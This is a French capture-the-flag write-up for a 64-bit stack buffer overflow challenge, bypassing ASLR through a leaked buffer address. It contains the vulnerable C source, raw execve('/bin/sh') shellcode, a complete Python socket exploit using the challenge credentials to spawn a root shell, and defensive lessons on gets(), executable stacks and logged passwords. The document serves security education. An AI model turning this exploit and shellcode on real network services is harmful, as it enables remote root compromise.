# Write-Up — AslrSt4ck0v3rfl0w (100 pts)

> **Auteur :** m3rv3di3 — PGE2 Epitech Bénin, spécialisation Cybersécurité  
> **Cible :** `nc ecorp.cyber.epitest.eu <PORT>` — service réseau `tracking-backup`  
> **Catégorie :** BOF + shellcode + bypass ASLR via info leak  

---

## Énoncé

> Hello friend...  
> Did I say final test ? I meant final test before the actual final maybe test! You finally found something interesting, but this time it is on a different host! This is the same thing really, or is it ? Don't pay attention to the buffer address, or maybe do?

Indices clés :
1. *"this time it is on a different host"* → service réseau via `nc`, pas SSH
2. *"This is the same thing really, or is it ?"* → même technique que St4ck0v3rfl0w (BOF + shellcode) mais avec ASLR
3. *"Don't pay attention to the buffer address, or maybe do?"* → **le programme leake lui-même l'adresse du buffer** → c'est la clé du bypass ASLR

---

## Pré-requis

Les credentials `backup` / `B4ckupSyncUnBr3ak4bl3P4ss2026!` ont été découverts dans `/var/log/preprod.log` lors du challenge St4ck0v3rfl0w :

```
Jun 12 10:04:12 ecorp-server backupd[2032]: connecting to backup server backup@preprod.ecorp.epi
Jun 12 10:04:12 ecorp-server backupd[2032]: using password: B4ckupSyncUnBr3ak4bl3P4ss2026!
```

L'URL de la source a également été découverte dans `preprod.log` :
```
Jun 12 08:11:11 ecorp-server CRON[1123]: (root) CMD (/usr/bin/wget https://ecorp.cyber.epitest.eu/files/static/tracking-backup.c)
```

---

## Récupération de la source

```bash
curl -s https://ecorp.cyber.epitest.eu/files/static/tracking-backup.c -o tracking-backup.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *gets(char *s);

int main(int argc, char **argv) {
  char buffer[678];
  char *username = NULL;
  char *password = NULL;
  size_t n = 49;
  ssize_t ret;

  printf("ECorp tracking backup.\n\n");
  printf("! Restricted access !\n");
  printf("username: ");
  fflush(stdout);
  ret = getline(&username, &n, stdin);
  if (ret)
    username[ret-1] = 0;
  printf("password: ");
  fflush(stdout);
  ret = getline(&password, &n, stdin);
  if (ret)
    password[ret-1] = 0;
  printf("'%s' '%s'\n", username, password);

  if (!strcmp(username, "backup") && !strcmp(password, "B4ckupSyncUnBr3ak4bl3P4ss2026!")) {
    printf("Thank you for logging in, enter the data you want to save\n");
    printf("[backup][%p] $> ", buffer);   // ⚠️ LEAK de l'adresse du buffer !
    fflush(stdout);
    gets(buffer);                          // ⚠️ BOF non borné
  }
  else
    printf("Unauthorized access detected! Your IP has been recorded!\n");
  return 0;
}

// gcc tracking-backup.c -fno-stack-protector -z execstack
// sudo sysctl -w kernel.randomize_va_space=2   ← ASLR activé !
```

Points critiques :
- `-fno-stack-protector` → pas de canary, BOF direct vers RIP
- `-z execstack` → stack exécutable → shellcode possible
- `randomize_va_space=2` → **ASLR complet activé** → adresse stack change à chaque exécution
- `printf("[backup][%p] $> ", buffer)` → **info leak** : le programme affiche lui-même l'adresse du buffer avant `gets()`
- `gets()` → pas de vérification de taille → overflow garanti

---

## Connexion initiale

```bash
nc ecorp.cyber.epitest.eu <PORT>
# ECorp tracking backup.
# ! Restricted access !
# username: backup
# password: B4ckupSyncUnBr3ak4bl3P4ss2026!
# 'backup' 'B4ckupSyncUnBr3ak4bl3P4ss2026!'
# Thank you for logging in, enter the data you want to save
# [backup][0x7ffc66164770] $>
```

L'adresse `0x7ffc66164770` est celle du buffer — elle change à chaque connexion grâce à l'ASLR, mais est fournie directement par le programme.

---

## Calcul de l'offset RIP

Compilation locale avec les mêmes flags :

```bash
gcc tracking-backup.c -fno-stack-protector -z execstack -fno-pie -no-pie -g -o /tmp/tb_dbg
```

Préparation du fichier d'input pour GDB (le `!` dans le password pose problème avec bash history) :

```bash
printf 'backup\nB4ckupSyncUnBr3ak4bl3P4ss2026!\ntest\n' > /tmp/input.txt
```

GDB pour trouver l'offset :

```bash
gdb /tmp/tb_dbg
(gdb) break main
(gdb) run < /tmp/input.txt
(gdb) next  # x10 jusqu'à après getline username
(gdb) print (int)($rbp - (char*)&buffer)
# $1 = 688
```

| Offset | Contenu |
|---|---|
| 0..677 | buffer[678] |
| 678..687 | alignement local (688 - 678 = 10 octets) |
| 688..695 | saved RBP |
| **696** | **return address (RIP)** |

→ **Offset = 688 + 8 = 696 octets**

---

## Stratégie de bypass ASLR

L'ASLR randomise les adresses stack à chaque exécution. La technique classique pour le bypasser est un **info leak** — obtenir l'adresse d'une variable stack pendant l'exécution.

Ici, le programme fait le travail à notre place :

```c
printf("[backup][%p] $> ", buffer);
```

→ On parse cette ligne pour extraire l'adresse, puis on l'utilise comme cible pour RIP.

**Flux d'exploitation :**
```
Connexion → Auth → Parse [0xADDR] → Build payload avec ADDR → Envoyer → Shell
```

---

## Construction du payload

Shellcode `execve("/bin/sh", NULL, NULL)` 64-bit (23 octets) :

```python
SHELLCODE = (
    b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e'
    b'\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58'
    b'\x99\x0f\x05'
)
```

Structure du payload :

```
[ shellcode (23 bytes) ][ padding (673 bytes) ][ buf_addr (8 bytes) ]
^                                               ^
début du buffer leaké                           écrase RIP → saute au shellcode
```

```python
padding = OFFSET - len(SHELLCODE)   # 696 - 23 = 673
payload = SHELLCODE + b'A' * padding + struct.pack('<Q', buf_addr)
```

---

## Exploit complet

```python
#!/usr/bin/env python3
"""
PoC — AslrSt4ck0v3rfl0w (ECorp CTF) — tracking-backup

BOF + shellcode sur stack exécutable avec ASLR activé.
Bypass via info leak : le programme affiche lui-même l'adresse du buffer
dans le prompt [backup][0xADDR] avant gets().

Usage :
    python3 exploit.py
"""

import socket
import struct
import re
import time

HOST = 'ecorp.cyber.epitest.eu'
PORT = 19877   # port assigné par le docker — à adapter

SHELLCODE = (
    b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e'
    b'\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58'
    b'\x99\x0f\x05'
)
OFFSET = 696


def recv_until(s, marker):
    data = b''
    while marker not in data:
        data += s.recv(1024)
    return data


def main():
    s = socket.socket()
    s.connect((HOST, PORT))

    # Authentification
    recv_until(s, b'username:')
    s.sendall(b'backup\n')

    recv_until(s, b'password:')
    s.sendall(b'B4ckupSyncUnBr3ak4bl3P4ss2026!\n')

    # Récupération du prompt avec l'adresse leakée
    data = recv_until(s, b'$>')
    match = re.search(rb'\[0x([0-9a-f]+)\]', data)
    buf_addr = int(match.group(1), 16)
    print(f'[*] Buffer address leak: {hex(buf_addr)}')

    # Construction du payload
    padding = OFFSET - len(SHELLCODE)
    payload = SHELLCODE + b'A' * padding + struct.pack('<Q', buf_addr)

    # Envoi du payload
    s.sendall(payload + b'\n')
    time.sleep(0.5)

    # Enumération et récupération du flag
    s.sendall(b'id\n')
    time.sleep(0.3)
    s.sendall(b'ls /\n')
    time.sleep(0.3)
    s.sendall(b'cat /root.txt\n')
    time.sleep(0.5)

    out = s.recv(4096)
    print(out.decode(errors='replace'))

    s.close()


if __name__ == '__main__':
    main()
```

---

## Exécution

```bash
python3 exploit.py
# [*] Buffer address leak: 0x7ffd5f994200
# uid=0(root) gid=0(root) groups=0(root)
# bin  boot  dev  etc  home  lib  lib64  ...  root.txt
# EPI{r4NdOm_4DdR35535_4r3_nO7_4_PRO8l3M_fOR_M3}
```

---

## Flag

```
EPI{r4NdOm_4DdR35535_4r3_nO7_4_PRO8l3M_fOR_M3}
```

Le wording (`r4NdOm_4DdR35535_4r3_nO7_4_PRO8l3M_fOR_M3` = *"Random addresses are not a problem for me"*) illustre parfaitement la leçon : l'ASLR seul ne suffit pas si le programme leake ses propres adresses.

---

## Récap technique

| Élément | Détail |
|---|---|
| Vulnérabilité | `gets(buffer[678])` → BOF non borné |
| Compilation | `-fno-stack-protector -z execstack` |
| Protection active | ASLR (`randomize_va_space=2`) |
| Bypass ASLR | Info leak via `printf("[backup][%p] $> ", buffer)` |
| Offset RIP | **696** (688 alignement + 8 saved RBP) |
| Shellcode | `execve("/bin/sh", NULL, NULL)` 64-bit, 23 octets |
| Vecteur | Service réseau TCP via `nc` |
| Privilege | `uid=0(root)` |
| Cible flag | `/root.txt` |

---

## Risques d'exploitation en production

### 1. Info Leak via format string
`printf("[backup][%p] $> ", buffer)` est un **cadeau à l'attaquant**. En production, afficher une adresse mémoire dans un prompt est une erreur critique car elle annule directement l'effet de l'ASLR. Tout format `%p`, `%x`, `%lx` dans un output réseau est une vulnérabilité potentielle.

### 2. ASLR seul ≠ protection suffisante
L'ASLR est une **mitigation**, pas une protection absolue. Il est inefficace si :
- Le programme leake une adresse (comme ici)
- Le binaire est 32-bit (espace d'adressage trop petit → bruteforce possible)
- Une autre vulnérabilité permet de lire la mémoire (format string, heap overflow...)

### 3. Stack exécutable (`-z execstack`)
Sans NX/DEP, n'importe quel byte sur la stack peut être exécuté. En production, cette option ne devrait **jamais** être utilisée. Les compilateurs modernes désactivent la stack exécutable par défaut.

### 4. `gets()` sur un service réseau
`gets()` est dangereuse en local, mais sur un service réseau exposé elle devient **critique** : n'importe quel client peut envoyer un payload arbitraire sans limite de taille. Toujours utiliser `fgets(buffer, sizeof(buffer), stdin)` ou `read()` avec une taille bornée.

### 5. Credentials en clair dans les logs
Les credentials `backup` / `B4ckupSyncUnBr3ak4bl3P4ss2026!` ont été découverts dans `/var/log/preprod.log` lors du challenge précédent. Loguer des mots de passe en clair est une faute grave de sécurité opérationnelle.

### 6. Service réseau root
Le service tourne en `uid=0(root)`. Un service réseau ne devrait jamais tourner en root. Le principe du moindre privilège impose de créer un utilisateur dédié avec les permissions minimales nécessaires.

---

## Leçons

- **L'ASLR est une mitigation, pas une solution** : dès qu'un info leak est possible, l'ASLR tombe. La vraie protection combine ASLR + NX + PIE + canary + pas de `gets()`.

- **Un prompt ne doit jamais afficher d'adresses mémoire** : même en debug, ces informations ne doivent pas être exposées à un client réseau.

- **`gets()` est bannie depuis C11** : son utilisation dans un service réseau est une CVE instantanée. Toute revue de code doit chercher et éliminer `gets()`.

- **La chaîne d'exploitation est cohérente** : les credentials trouvés dans `preprod.log` (St4ck0v3rfl0w) ouvrent ce challenge. C'est une illustration parfaite de la **latéralisation** en pentest — chaque information trouvée peut ouvrir de nouveaux vecteurs.

- **Énumérer avant de supposer** : on a d'abord fait `ls /` pour voir `root.txt` plutôt que de supposer l'emplacement du flag. En CTF comme en pentest, l'énumération méthodique évite de passer à côté de la cible.

---

## PoC complet

Voir script d'exploit ci-dessus — auto-suffisant, parse le leak dynamiquement, fonctionne quel que soit le port du docker.
